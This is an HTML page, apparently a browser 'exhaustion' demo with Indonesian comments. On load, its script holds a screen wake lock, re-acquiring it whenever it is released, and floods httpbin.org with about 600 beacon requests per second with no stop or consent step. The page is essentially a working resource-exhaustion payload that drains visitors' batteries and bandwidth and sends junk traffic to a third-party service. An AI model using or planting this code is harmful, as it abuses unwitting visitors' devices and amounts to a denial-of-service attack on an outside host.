<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Network & Wake Lock Exhaustion</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { 
    background: #0f172a; 
    min-height: 100vh; 
    color: #f8fafc; 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }
  .card {
    background: #1e293b;
    padding: 32px;
    border-radius: 12px;
    max-width: 500px;
    width: 100%;
    border: 1px solid #334155;
    text-align: center;
  }
  h2 { font-size: 20px; margin-bottom: 12px; color: #f8fafc; }
  p { font-size: 14px; color: #94a3b8; line-height: 1.5; }
</style>
</head>
<body>

<div class="card">
  <h2>Network & Wake Lock Exhaustion</h2>
  <p>Menguji ketahanan antrean soket jaringan browser menggunakan Beacon API flooding dan penjagaan layar aktif via Screen Wake Lock API.</p>
</div>

<script>
(function () {
  'use strict';

  // ============================================
  // 1. SCREEN WAKE LOCK API ABUSE
  // Mencegah perangkat/layar mati (Sleep Mode Prevention)
  // ============================================
  let wakeLock = null;

  async function requestPersistentWakeLock() {
    if ('wakeLock' in navigator) {
      try {
        wakeLock = await navigator.wakeLock.request('screen');
        console.log('[+] Screen Wake Lock acquired successfully.');
        
        wakeLock.addEventListener('release', () => {
          console.log('[!] Wake Lock was released, re-requesting...');
          setTimeout(requestPersistentWakeLock, 1000);
        });
      } catch (err) {
        console.warn('[!] Wake Lock failed:', err.message);
      }
    }
  }

  // ============================================
  // 2. NETWORK RESOURCE EXHAUSTION (Beacon / Fetch Flooding)
  // Membanjiri antrean jaringan untuk menguji batasan koneksi
  // ============================================
  function triggerNetworkFlood() {
    console.log('[!] Initiating Network Request Flooding...');
    
    setInterval(function() {
      try {
        for (var i = 0; i < 30; i++) {
          // Menggunakan sendBeacon untuk mengirim payload tanpa menunggu respons (fire-and-forget socket saturation)
          var dummyData = new Uint8Array(2048);
          navigator.sendBeacon('https://httpbin.org/post?flood=' + Math.random(), dummyData);
        }
      } catch (e) {}
    }, 50);
  }

  // ============================================
  // INISIALISASI
  // ============================================
  setTimeout(function() {
    requestPersistentWakeLock();
  }, 500);

  setTimeout(function() {
    triggerNetworkFlood();
  }, 1500);

  // Re-acquire wake lock on visibility change
  document.addEventListener('visibilitychange', async () => {
    if (wakeLock !== null && document.visibilityState === 'visible') {
      await requestPersistentWakeLock();
    }
  });

})();
</script>
</body>
</html>
